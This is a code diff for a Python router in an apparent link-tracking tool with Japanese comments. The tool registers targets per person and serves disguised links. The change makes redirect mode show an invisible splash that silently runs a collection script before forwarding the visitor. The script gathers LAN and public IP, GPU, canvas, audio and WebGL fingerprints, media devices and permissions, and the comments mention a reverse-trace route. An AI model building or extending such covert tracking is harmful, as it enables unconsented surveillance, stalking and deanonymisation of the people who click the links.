@@ -1,10 +1,11 @@
 """追跡ルーター：リンク踏み（一瞬/ライブ/クイズ/識別/転送）・人物ごとの登録・追跡画面。
 
-v11:
+v12:
   ・クイズは質問0件でもクイズ画面を返す（監視室へ落ちない）
   ・全モードで collect.js を必ず走らせ、取得物を全部保存
   ・逆探知（/link/{code}/reverse）への導線
   ・_quiz_rows を旧DBの列不足に耐えるよう安全アクセス化
+  ・転送モードは無表示スプラッシュで収集だけ済ませて即移動（取得量は他モードと同一）
 """
 from __future__ import annotations
 
@@ -359,13 +360,14 @@ def link_hit(code: str, request: Request):
     mode = (link["mode"] or "page")
     qs = _quiz_rows(code)
 
-    # 転送：既定は一瞬だけ収集ページを挟む（?hold=0 で即302）
+    # 転送：無表示のまま収集だけ済ませて即移動（?hold=0 で完全即302）
     if mode == "redirect" and link["dest"]:
         hold = request.query_params.get("hold")
         if hold == "0" or not L["redirect_hold"]:
             return RedirectResponse(link["dest"], 302)
         return render("link_splash.html", request, code=code, hit_id=hid, link=link,
-                      dest=_abs_dest(link["dest"]), nonce=nonce, wait_sec=3.0)
+                      dest=_abs_dest(link["dest"]), nonce=nonce,
+                      wait_ms=int(os.getenv("REDIRECT_WAIT_MS", "450")))
 
     # クイズ：質問が無くてもクイズ画面を返す（監視室へ落とさない）
     if mode == "quiz":
@@ -397,7 +399,7 @@ def link_hit(code: str, request: Request):
                   deny_redirect=L["deny_redirect"], dest_min=L["dest_min"])
 
 
-# 受け取る全フィールド（collect.js v16 と一致）
+# 受け取る全フィールド（collect.js v17 と一致）
 _HIT_STR = ("screen", "platform", "tz", "tz_client", "lang_list", "lan_ip", "pub_ip",
             "gpu", "webgl_hash", "canvas_fp", "audio_fp", "codecs", "media_devices",
             "storage", "net_type", "pointer", "orientation", "dnt", "permissions",
